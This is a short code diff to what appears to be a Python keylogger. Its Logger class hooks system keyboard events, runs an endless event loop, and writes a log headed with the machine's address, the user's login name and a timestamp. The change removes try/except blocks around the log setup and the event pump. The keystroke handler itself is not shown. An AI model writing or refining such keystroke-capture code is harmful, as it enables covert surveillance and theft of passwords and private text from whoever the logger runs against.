@@ -35,13 +35,10 @@ class Logger:
         t.start()
 
     def mk_log(self):
-        try:
-            self.log = open(self.path, 'w')
-            header = "-=[" + get_local_addr() + " " + os.getlogin() + " " + time.strftime("%d/%m/%Y %H:%M:%S") + "]=-\n"
-            divider = "______________________________________________________\n\n"
-            general.append_to_file(self.path, header + divider)
-        except:
-            pass
+        self.log = open(self.path, 'w')
+        header = "-=[" + get_local_addr() + " " + os.getlogin() + " " + time.strftime("%d/%m/%Y %H:%M:%S") + "]=-\n"
+        divider = "______________________________________________________\n\n"
+        general.append_to_file(self.path, header + divider)
 
     def start(self):
 
@@ -50,13 +47,9 @@ class Logger:
         self.hook.KeyDown = self.on_keyboard_event
         self.hook.HookKeyboard()
 
-        try:
-            # Starts the event pump
-            while True:
-                pygame.event.pump()
-        except:
-            while True:
-                pygame.event.pump()
+        # Starts the event pump
+        while True:
+            pygame.event.pump()
 
     def pause(self):
         self.paused = True
